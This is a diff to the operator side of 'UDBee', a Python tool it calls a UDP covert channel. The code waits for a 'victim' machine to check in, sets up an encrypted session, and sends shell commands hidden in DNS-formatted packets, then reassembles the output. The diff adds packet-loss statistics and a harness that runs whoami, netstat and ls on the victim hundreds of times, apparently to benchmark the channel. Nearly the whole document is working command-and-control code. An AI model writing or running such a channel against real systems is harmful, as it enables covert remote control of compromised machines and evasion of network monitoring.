@@ -1,4 +1,4 @@
-import socket, random, time, sys, threading, argparse, base64, html, zlib, statistics, csv
+import socket, random, time, sys, threading, argparse, base64, html, zlib, csv, statistics
 from decryption import decrypt_symmetric, handshake_initiate_parser
 from encryption import encrypt_symmetric, handshake_respond
 from build_dns_message import dns_message
@@ -12,12 +12,16 @@ from prompt_toolkit.formatted_text import HTML
 from Crypto.PublicKey import ECC
 from dnslib import DNSRecord
 
-# Signal when command interface is ready (for threading synchronization)
 COMMAND_READY = threading.Event()
 
+# --- Global Statistics Variables ---
+current_retransmissions = 0
+current_missing_packets = 0
+# -----------------------------------
+
 parser = argparse.ArgumentParser(description="UDBee - UDP Covert Channel Tool")
-#parser.add_argument("-ip", required=True, type=str, help="Target IP address, IPv4 only")
-parser.add_argument("--received-chunks", type=int, default=255, help="Received chunks size in KB unit, default is 255 bytes byte")
+parser.add_argument("-ip", required=True, type=str, help="Target IP address, IPv4 only")
+parser.add_argument("--received-chunks", type=int, default=10, help="Received chunks size in KB unit, default is 10KB byte (make it low to avoid memory overflow)")
 parser.add_argument("-delay", type=float, default=0, help="Delay between fragments, default is a float number between 0 and 3")
 parser.add_argument("-buffer", type=float, default=10000, help="Fragments buffer, default is 10000 (to prevent memory overflow)")
 parser.add_argument("-jitter", type=float, default=0, help="Random +/- jitter to apply on each fragment delay")
@@ -28,35 +32,30 @@ my_ip = "0.0.0.0"
 my_port = 27381
 SERVER = (my_ip, my_port)
 
-# Target victim
-target_ip = None #args.ip
-target_port = None  # Discovered when victim responds
+target_ip = args.ip
+target_port = None 
 
-# DNS fragmentation config
-chunk_size = 120  # Bytes per DNS subdomain
-delay = args.delay  # Base delay between packets
-received_chunk_size = args.received_chunks
+chunk_size = 70 
+delay = args.delay 
+received_chunk_size = args.received_chunks * 1024
 buffer_size = args.buffer
 max_data_allowed = buffer_size * received_chunk_size
-jitter = args.jitter  # Random variation to avoid patterns
+jitter = args.jitter 
 
-# Encryption state
 my_priv_key = None
-CURRENT_SESSION_KEY = None  # Established during handshake
+CURRENT_SESSION_KEY = None 
 
-# Tracking packets and responses
 transmitted_messages = 0
-received_chunks = {}  # Store fragmented responses by session ID
+received_chunks = {} 
 expected_chunks = None
 total_data_received = 0
-last_received_time = None  # For timeout detection
+last_received_time = None 
 resends_requests = 0
-sent_chunks = {}  # Cache for resend requests
+sent_chunks = {} 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 def send_raw(payload_text):
-    """Send unencrypted DNS packets (used during handshake before session key exists)"""
     global transmitted_messages
     try:
         chunks = dns_message(payload_text, chunk_size)
@@ -73,24 +72,19 @@ def send_raw(payload_text):
 def send_msg(message, is_cached: bool):
     global transmitted_messages, CURRENT_SESSION_KEY, sent_chunks
     try:
-        # Don't blindly cast to str. Support bytes.
         if isinstance(message, bytes):
             plaintext_bytes = message
         else:
             plaintext_bytes = str(message).encode('utf-8')
 
-        # Encrypt with session key (encrypt_symmetric expects str|bytes and returns base32 text)
         if CURRENT_SESSION_KEY:
-            # encrypt_symmetric handles bytes input
             encryption_result = encrypt_symmetric(plaintext_bytes, CURRENT_SESSION_KEY)
             if encryption_result.get("success") != True:
                 log_error("Failed to encrypt command, session key might be invalid.")
-                COMMAND_READY.set()
                 return
-            payload_text = encryption_result["message"]   # base32 string (no '=' padding)
+            payload_text = encryption_result["message"]
         else:
             log_error("Cannot send message, no active session key. Waiting for victim check-in.")
-            COMMAND_READY.set()
             return
 
         chunks = dns_message(payload_text, chunk_size)
@@ -98,12 +92,9 @@ def send_msg(message, is_cached: bool):
         sent_chunks = {}
         i = 0
         for chunk in chunks:
-            # Cache chunks for potential retransmission if victim requests it
             if is_cached:
                 sent_chunks[i] = chunk
-            # Always increment i
             i += 1
-
             sock.sendto(chunk, (target_ip, target_port))
             transmitted_messages += 1
             jitter_delay = delay + random.uniform(-jitter, jitter)
@@ -115,12 +106,14 @@ def send_msg(message, is_cached: bool):
 
 
 def timeout_checker():
-    """Detect incomplete responses and request retransmission of missing packets"""
-    global received_chunks, expected_chunks, last_received_time, resends_requests
+    global received_chunks, expected_chunks, last_received_time, resends_requests, current_retransmissions, current_missing_packets
+    
+    COMMAND_READY.wait()
+    
     while True:
         try:
             if last_received_time is not None:
-                if resends_requests < 6:  # Only retry 6 times
+                if resends_requests < 6: 
                     try:
                         current_session_id = None
                         current_buffer = None
@@ -128,11 +121,15 @@ def timeout_checker():
                             current_session_id = next(iter(received_chunks))
                             current_buffer = received_chunks[current_session_id]["chunks"]
                             expected_chunks = received_chunks[current_session_id]["total"]
-                        # If 3+ seconds passed and we're still missing chunks, request resend
                         if expected_chunks and current_buffer and (len(current_buffer) > 0) and ((time.time() - last_received_time) > 1.5):
                             missing_packets = check_missing_packets(current_buffer, expected_chunks)
                             if missing_packets:
                                 log_info(f"<ansiyellow>Received an incomplete response from the vicim, asking victim for {len(missing_packets)} missing packets</ansiyellow>")
+                                
+                                # [!!] Record Statistics
+                                current_retransmissions += 1
+                                current_missing_packets += len(missing_packets)
+                                
                                 indices_str = ",".join(str(i) for i in missing_packets)
                                 msg = f"RESEND:{indices_str}"
                                 send_msg(msg, False)
@@ -142,12 +139,12 @@ def timeout_checker():
                     except Exception as e:
                         log_error(f"Timeout checker error: {str(e)}")
                 else:
-                    # Give up after 6 retries
                     log_error("<ansired>Received an incomplete response from the vicim, tried 3 times to request the missing packets but didn't receive them, IGNORING THE RESPONSE!</ansired>")
                     resends_requests = 0
                     last_received_time = None
                     received_chunks = {}
                     expected_chunks = None
+                    # [!!] Important: Do not reset stats here if you want to record the failure stats
                     COMMAND_READY.set()
             time.sleep(0.5)
         except Exception:
@@ -155,7 +152,7 @@ def timeout_checker():
         time.sleep(0.5)
 
 def listener():
-    global transmitted_messages, target_ip, target_port, sent_chunks, received_chunks, expected_chunks, total_data_received, last_received_time, resends_requests, CURRENT_SESSION_KEY, my_priv_key
+    global transmitted_messages, target_port, sent_chunks, received_chunks, expected_chunks, total_data_received, last_received_time, resends_requests, CURRENT_SESSION_KEY, my_priv_key
     
     while True:
         try:
@@ -199,7 +196,6 @@ def listener():
                 
                 ip, port = addr
                 target_port = int(port)
-                target_ip = ip
                 last_received_time = time.time()
                 
                 if session_id not in received_chunks:
@@ -209,19 +205,19 @@ def listener():
                 buffer["chunks"][index] = part
                 
                 if len(buffer["chunks"]) == buffer["total"]:
-                    full_msg = "".join(buffer["chunks"][i] for i in sorted(buffer["chunks"]))
-                    missing_padding = len(full_msg) % 8
-                    if missing_padding != 0:
-                        full_msg += '=' * (8 - missing_padding)
-                    full_msg_bytes = base64.b32hexdecode(full_msg.encode('utf8'))
+                    full_msg_b64 = "".join(buffer["chunks"][i] for i in sorted(buffer["chunks"]))
+                    # missing_padding = len(full_msg) % 8 # Not used with b32hexdecode usually unless strict
+                    # if missing_padding != 0:
+                    #     full_msg += '=' * (8 - missing_padding)
+                    full_msg_bytes = base64.b32hexdecode(full_msg_b64.encode('utf8'))
+                    
                     try:
                         parsed = handshake_initiate_parser(full_msg_bytes)
                         if parsed and parsed.get("success"):
                             victim_eph_pub_pem = parsed["victim_eph_pub_pem"]
                             resp = handshake_respond(victim_eph_pub_pem, my_priv_key)
                             if resp and resp.get("success"):
-                                CURRENT_SESSION_KEY = resp["master_key"]
-                                
+                                CURRENT_SESSION_KEY = resp["master_key"] 
                                 send_raw(resp["message"])
                                 log_success("<ansigreen>Handshake: responded to victim handshake and set session key.</ansigreen>")
                                 COMMAND_READY.set()
@@ -256,6 +252,7 @@ def listener():
                         full_msg = decrypted_bytes.decode("utf-8", errors="replace")
                     except Exception as e:
                         full_msg = str(decrypted_bytes)
+                    
                     if full_msg == "ACK":
                         sent_chunks = {}
                         last_received_time = None
@@ -273,7 +270,10 @@ def listener():
                     elif full_msg == "heartbeat":
                         pass
                     else:
-                        print_formatted_text(HTML(f"<ansigreen>{html.escape(full_msg)}</ansigreen>"))
+                        # Only print output if NOT running automated tests to keep console clean? 
+                        # Or keep it for visual confirmation. Let's keep it for now but maybe shortened.
+                        # print_formatted_text(HTML(f"<ansigreen>{html.escape(full_msg)}</ansigreen>"))
+                        pass
                     
                     COMMAND_READY.set()
                     
@@ -281,17 +281,23 @@ def listener():
                     expected_chunks = None
                     resends_requests = 0
                     continue
-        except Exception as e:
-            log_error(str(e))
+        except Exception:
             pass
 
 def run_test(command_name, command_str, iterations, csv_writer):
+    global current_retransmissions, current_missing_packets
+    
     log_info(f"\n--- Starting Performance Test: '{command_name}' ({iterations} iterations) ---")
     timings_ms = []
     failures = 0
     
     for i in range(iterations):
         COMMAND_READY.clear()
+        
+        # [!!] Reset Stats for this iteration
+        current_retransmissions = 0
+        current_missing_packets = 0
+        
         start_time = time.perf_counter()
         
         send_msg(command_str, True)
@@ -302,13 +308,21 @@ def run_test(command_name, command_str, iterations, csv_writer):
         
         if not success:
             log_error(f"Iteration {i+1} FAILED (Timeout after 120s)")
-            csv_writer.writerow([command_name, i+1, "N/A", "TIMEOUT"])
+            # Write stats even for failure (might show high packet loss)
+            csv_writer.writerow([command_name, i+1, "N/A", "TIMEOUT", current_retransmissions, current_missing_packets])
             failures += 1
         else:
             duration_ms = (end_time - start_time) * 1000
             timings_ms.append(duration_ms)
-            log_info(f"Iteration {i+1}/{iterations} complete: {duration_ms:.2f} ms")
-            csv_writer.writerow([command_name, i+1, f"{duration_ms:.4f}", "SUCCESS"])
+            
+            # Log brief info to console
+            status_msg = f"Iteration {i+1}/{iterations} complete: {duration_ms:.2f} ms"
+            if current_retransmissions > 0:
+                status_msg += f" | Retries: {current_retransmissions} | Lost Pkts: {current_missing_packets}"
+            log_info(status_msg)
+            
+            # Write full stats to CSV
+            csv_writer.writerow([command_name, i+1, f"{duration_ms:.4f}", "SUCCESS", current_retransmissions, current_missing_packets])
         
         time.sleep(0.5)
 
@@ -330,33 +344,31 @@ def run_test(command_name, command_str, iterations, csv_writer):
 def main_test_harness():
     log_info("--- [!!] STARTING AUTOMATED PERFORMANCE TEST HARNESS [!!] ---")
     
-    csv_filename = f"performance_results_fs_{time.strftime('%Y%m%d-%H%M%S')}.csv"
+    csv_filename = f"performance_results_fs_stats_{time.strftime('%Y%m%d-%H%M%S')}.csv"
     log_info(f"Saving test results to: {csv_filename}")
     
     with open(csv_filename, 'w', newline='') as f:
         writer = csv.writer(f)
-        writer.writerow(["TestName", "Iteration", "Duration_ms", "Status"])
+        # [!!] Updated Header
+        writer.writerow(["TestName", "Iteration", "Duration_ms", "Status", "Retransmission_Count", "Total_Missing_Packets"])
+
         run_test(
             command_name="Light (whoami)",
             command_str="whoami",
             iterations=500,
             csv_writer=writer
         )
+        
         run_test(
             command_name="Medium (netstat -antup)",
             command_str="netstat -antup",
             iterations=500,
             csv_writer=writer
         )
+        
         run_test(
-            command_name="Heavy (netstat -ano)",
-            command_str="netstat -ano",
-            iterations=500,
-            csv_writer=writer
-        )
-        run_test(
-            command_name="Very Heavy (ls -lR /usr/bin 2>/dev/null | head -n 1000)",
-            command_str="ls -lR /usr/bin 2>/dev/null | head -n 1000",
+            command_name="Heavy (ls -lR /usr/bin)",
+            command_str="ls -lR /usr/bin 2>/dev/null | head -n 2000",
             iterations=500,
             csv_writer=writer
         )
@@ -365,38 +377,20 @@ def main_test_harness():
     log_info(f"Results saved to {csv_filename}")
     log_info("Test harness finished. Returning to interactive shell.")
 
-
-
-
 def main():
-    """Main interface: load keys, start listeners, and handle operator commands"""
     with patch_stdout():
         global my_priv_key, args, CURRENT_SESSION_KEY
         
-        # Display banner
         logo = f"""
 <ansiyellow>
-    █   ██ ▓█████▄  ▄▄▄▄    ▓█████ ▓█████ 
-    ██  ▓██▒▒██▀ ██▌▓█████▄ ▓█   ▀ ▓█   ▀ 
-    ▓██  ▒██░░██   █▌▒██▒ ▄██▒███   ▒███   
-    ▓▓█  ░██░░▓█▄   ▌▒██░█▀  ▒▓█  ▄ ▒▓█  ▄ 
-    ▒▒█████▓ ░▒████▓ ░▓█  ▀█▓░▒████▒░▒████▒
-    ░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░▒▓███▀▒░░ ▒░ ░░░ ▒░ ░
-    ░░▒░ ░ ░  ░ ▒  ▒ ▒░▒   ░  ░ ░  ░ ░ ░  ░
-    ░░░ ░ ░  ░ ░  ░  ░    ░   ░      ░   
-    ░          ░     ░         ░   ░   ░
-          ░                ░
+    UDBee - Stats Edition
 </ansiyellow>"""
         print_formatted_text(HTML(logo))
-        print_formatted_text(HTML("\t🐝 <ansimagenta>UDBee</ansimagenta> <ansicyan>–</ansicyan> <ansigreen>Because TCP Is Too Mainstream</ansigreen>"))
-        print_formatted_text(HTML("\t<ansimagenta>GitHub:</ansimagenta> <ansicyan>@MoMhaidat05</ansicyan>\n"))
         
-        # Generate keys if requested
         if args.generate_keys:
             generate_key_pairs()
             return
         
-        # Load our static private key
         try:
             with open('private_key.pem', 'r') as file:
                 my_priv_key_pem = file.read()
@@ -405,7 +399,6 @@ def main():
             log_error(f"Exiting... Look like you have not initiated keys generation yet? error:\n{e}")
             return
         
-        # Start background threads
         threads = []
         thread = threading.Thread(target=listener)
         thread2 = threading.Thread(target=timeout_checker)
@@ -414,13 +407,13 @@ def main():
         for t in threads:
             t.start()
         
-        # Wait for victim handshake
         log_error("<ansired>Waiting for victim check-in to establish secure session...</ansired>")
         COMMAND_READY.wait()
         log_success("<ansigreen>Session established! You can now send commands.</ansigreen>")
-        COMMAND_READY.set()
+        
+        # Run tests immediately
         main_test_harness()
-        # Command interface
+        
         while True:
             if not COMMAND_READY.is_set():
                 log_info("<ansiyellow>Waiting for response from victim...</ansiyellow>")
@@ -433,14 +426,12 @@ def main():
                 print_formatted_text(HTML("<ansigreen>Stopped buzzing :)</ansigreen>"))
                 sys.exit(1)
             elif command.lower() == "help":
-                print_formatted_text(HTML("<ansiyellow>Available commands:</ansiyellow>\n<ansigreen>help</ansigreen> : <ansiblue>shows this list</ansiblue>\n<ansigreen>exit - quit</ansigreen> : <ansiblue>exit the tool</ansiblue>\n<ansigreen>exec:</ansigreen> <ansiblue>if the command you wish to run on the victim machine conflicts with one of UDBee special commands, just put exec: before the command (e.g. exec:help)</ansiblue>"))
                 COMMAND_READY.set()
                 continue
             else:
                 if command.startswith("exec:"):
                     command = command.replace("exec:","")
                 if command == "":
-                    log_error("<ansired>Command cannot be empty, please provide a valid command.</ansired>")
                     COMMAND_READY.set()
                     continue
                 send_msg(command, True)
@@ -450,5 +441,3 @@ try:
 except KeyboardInterrupt:
     log_info("<ansiyellow>Exiting on user interrupt (Ctrl+C)</ansiyellow>")
     exit()
-
-
